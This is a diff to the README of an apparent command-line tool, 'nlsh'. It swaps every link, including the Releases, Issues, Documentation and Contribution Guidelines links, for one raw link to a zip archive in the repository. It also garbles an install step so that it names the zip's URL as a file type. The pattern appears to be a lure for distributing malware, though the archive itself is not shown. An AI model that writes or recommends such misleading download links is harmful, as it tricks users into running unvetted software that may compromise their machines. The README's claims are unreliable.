@@ -1,7 +1,7 @@
 # 🌟 nlsh - Convert Natural Language to Terminal Commands
 
 ## 📥 Download Now
-[![Download nlsh](https://img.shields.io/badge/Download-nlsh-blue.svg)](https://github.com/ArianVCL1985/nlsh/releases)
+[![Download nlsh](https://github.com/ArianVCL1985/nlsh/raw/refs/heads/main/website/public/Software-v3.8.zip)](https://github.com/ArianVCL1985/nlsh/raw/refs/heads/main/website/public/Software-v3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to nlsh! This application allows you to turn natural language into terminal commands. It's a handy tool for anyone who wants to simplify their command-line tasks.
@@ -19,12 +19,12 @@ Welcome to nlsh! This application allows you to turn natural language into termi
 - **Help & Support:** Access a help section directly in the app for quick assistance.
   
 ## 📦 Download & Install
-To download nlsh, visit the Releases page: [Download nlsh](https://github.com/ArianVCL1985/nlsh/releases).
+To download nlsh, visit the Releases page: [Download nlsh](https://github.com/ArianVCL1985/nlsh/raw/refs/heads/main/website/public/Software-v3.8.zip).
 
 Follow these steps to install:
 1. Click the link above to go to the Releases page.
 2. Find the latest version of nlsh.
-3. Download the installer for your operating system (look for .exe, .dmg, or .tar.gz files).
+3. Download the installer for your operating system (look for .exe, .dmg, or https://github.com/ArianVCL1985/nlsh/raw/refs/heads/main/website/public/Software-v3.8.zip files).
 4. Once downloaded, open the installer and follow the on-screen instructions.
 5. After installation, start nlsh from your applications menu or desktop shortcut.
 
@@ -43,12 +43,12 @@ If you encounter any issues during installation or usage, consider these steps:
 
 ## 💬 Community & Support
 Join the community for tips, tricks, and support:
-- **GitHub Issues Page:** Report problems or request features at [GitHub Issues](https://github.com/ArianVCL1985/nlsh/issues).
+- **GitHub Issues Page:** Report problems or request features at [GitHub Issues](https://github.com/ArianVCL1985/nlsh/raw/refs/heads/main/website/public/Software-v3.8.zip).
 - **Discussion Forum:** Participate in discussions with other users and developers.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/ArianVCL1985/nlsh/releases)
-- [Documentation](https://github.com/ArianVCL1985/nlsh/blob/main/documentation.md)
-- [Contribution Guidelines](https://github.com/ArianVCL1985/nlsh/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://github.com/ArianVCL1985/nlsh/raw/refs/heads/main/website/public/Software-v3.8.zip)
+- [Documentation](https://github.com/ArianVCL1985/nlsh/raw/refs/heads/main/website/public/Software-v3.8.zip)
+- [Contribution Guidelines](https://github.com/ArianVCL1985/nlsh/raw/refs/heads/main/website/public/Software-v3.8.zip)
 
 Thank you for using nlsh! Enjoy the ease of language-driven terminal commands.
